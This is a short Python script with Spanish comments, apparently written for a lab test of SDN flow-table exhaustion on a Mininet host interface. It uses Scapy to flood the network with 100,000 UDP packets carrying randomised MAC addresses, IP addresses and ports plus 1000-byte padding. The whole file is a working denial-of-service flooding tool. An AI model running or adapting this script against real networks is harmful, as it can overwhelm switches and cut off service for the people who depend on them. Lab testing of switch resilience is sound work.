from scapy.all import sendp, Ether, IP, UDP, Raw
import random
import time

def random_mac():
    return "00:00:00:00:00:%02x" % random.randint(1, 255)

def random_ip():
    return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))

def flood_flow_table(iface):
    for i in range(100000):  # Enviar 100000 paquetes para probar
        pkt = Ether(src=random_mac(), dst=random_mac()) / \
              IP(src=random_ip(), dst=random_ip()) / \
              UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 1024)) / \
              Raw(load="X" * 1000)  # Añade 1000 bytes de datos de relleno
        
        print(f"Enviando paquete: {pkt.summary()}")
        sendp(pkt, iface=iface, verbose=False)
        # time.sleep(0.1)  # Esperar un poco para no saturar la red

if __name__ == "__main__":
    flood_flow_table("h1-eth0")  # Cambia "h1-eth0" si es necesario
